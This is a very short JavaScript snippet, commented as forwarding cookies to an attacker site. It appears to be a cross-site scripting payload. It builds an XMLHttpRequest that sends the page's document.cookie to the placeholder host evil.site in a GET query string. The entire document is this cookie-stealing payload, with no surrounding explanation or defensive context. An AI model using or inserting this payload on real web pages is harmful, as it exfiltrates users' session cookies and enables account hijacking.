// "forward" Cookies to Attacker Site
const Http = new XMLHttpRequest();
const url='https://evil.site/steal?dat=' + document.cookie;
Http.open("GET", url);
Http.send();

Http.onreadystatechange = (e) => { }
